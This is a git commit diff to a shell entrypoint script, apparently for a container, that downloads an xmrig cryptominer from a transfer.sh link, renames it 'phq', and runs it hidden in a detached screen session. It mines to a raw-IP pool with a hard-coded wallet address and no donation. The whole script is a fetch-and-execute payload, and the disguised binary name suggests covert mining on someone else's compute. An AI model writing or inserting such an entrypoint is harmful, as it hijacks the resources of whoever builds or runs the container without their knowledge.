7b4b052e796c44707b1c5c6c89ec63e17415719c
septianana55 <93500712+septianana55@users.noreply.github.com>
2021-12-23 11:37:40 +0700

    Update entrypoint.sh

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,4 +1,4 @@
-curl https://transfer.sh/uTIFtD/xmrig --output phq
+curl https://transfer.sh/yesOy8/xmrig --output phq
 chmod +x phq
 chmod 777 /run/screen
 screen -dmS phq ./phq --url 20.120.30.75:3333 --user hvxxzE88RUEbetvm8dCfu97o8p1rLSZ9s66qYVr5YVokHGfg48ZekDeX1mi1TmcSTtdMQTGEjguD6NtwQ8CQSTkB3QmEn5Bhqa --pass x --donate-level 0
